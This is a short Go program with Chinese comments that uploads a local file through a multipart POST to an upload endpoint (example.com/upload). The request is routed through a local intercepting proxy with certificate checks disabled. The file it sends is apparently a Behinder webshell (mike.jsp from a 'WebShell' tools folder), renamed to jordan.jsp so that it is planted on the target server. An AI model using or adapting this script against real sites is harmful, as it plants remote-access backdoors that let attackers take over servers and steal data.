package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"time"
)

var proxyUrl, _ = url.Parse("http://127.0.0.1:8080")

var transport = &http.Transport{
	Proxy: http.ProxyURL(proxyUrl), //设置代理发送请求
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true, //通过设置Transport的TLSClientConfig来忽略证书验证:
	},
}

var client = http.Client{
	Timeout:   time.Second * 10,
	Transport: transport,
}

func main() {
	// 创建一个缓冲区来存储表单数据
	var requestBody bytes.Buffer

	// 创建一个multipart writer
	writer := multipart.NewWriter(&requestBody)

	// 打开要上传的文件
	file, err := os.Open("D:\\youxi\\0x7eTools\\Tools\\WebShell\\webshell_Manage\\Behinder\\Behinder_v4.0.6\\server\\mike.jsp")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	// 创建一个表单字段，将文件内容写入该字段
	fileField, err := writer.CreateFormFile("file", "jordan.jsp")
	if err != nil {
		fmt.Println(err)
	}
	_, err = io.Copy(fileField, file)
	if err != nil {
		fmt.Println(err)
	}

	// 添加其他表单字段，如果有的话
	_ = writer.WriteField("key", "value")

	// 关闭multipart writer，以便写入结束标志
	err = writer.Close()
	if err != nil {
		fmt.Println(err)
	}

	// 创建一个POST请求
	request, err := http.NewRequest("POST", "http://example.com/upload", &requestBody)
	if err != nil {
		fmt.Println(err)
	}

	// 设置Content-Type头部为multipart/form-data
	request.Header.Set("Content-Type", writer.FormDataContentType())

	// 发送请求
	resp, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	// 处理响应
	fmt.Println(resp.Status, " ", len(body))
}
